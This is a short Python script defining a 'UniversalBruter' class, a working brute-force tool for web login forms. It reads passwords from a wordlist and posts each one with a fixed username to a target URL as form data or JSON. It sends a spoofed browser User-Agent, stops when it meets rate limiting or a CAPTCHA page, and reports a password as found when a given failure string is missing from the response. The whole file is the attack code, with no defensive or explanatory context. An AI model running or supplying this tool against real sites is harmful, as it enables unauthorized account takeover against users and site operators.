import requests
import sys

class UniversalBruter:
    def __init__(self, target_url, wordlist, user_field, pass_field, username, failure_str):
        self.target_url = target_url
        self.wordlist = wordlist
        self.user_field = user_field
        self.pass_field = pass_field
        self.username = username
        self.failure_str = failure_str
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })

    def run(self, use_json=False):
        try:
            with open(self.wordlist, 'r', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    payload = {self.user_field: self.username, self.pass_field: password}
                    
                    try:
                        if use_json:
                            response = self.session.post(self.target_url, json=payload, timeout=10)
                        else:
                            response = self.session.post(self.target_url, data=payload, timeout=10)
                        
                        if response.status_code == 429:
                            return {"status": "error", "message": "Rate limited"}
                        
                        if any(x in response.text.lower() for x in ["captcha", "security check", "robot"]):
                            return {"status": "error", "message": "Bot detected"}

                        if self.failure_str not in response.text:
                            return {"status": "success", "password": password}
                            
                    except requests.exceptions.RequestException as e:
                        return {"status": "error", "message": str(e)}
            
            return {"status": "failed", "message": "No match"}
            
        except FileNotFoundError:
            return {"status": "error", "message": "File not found"}
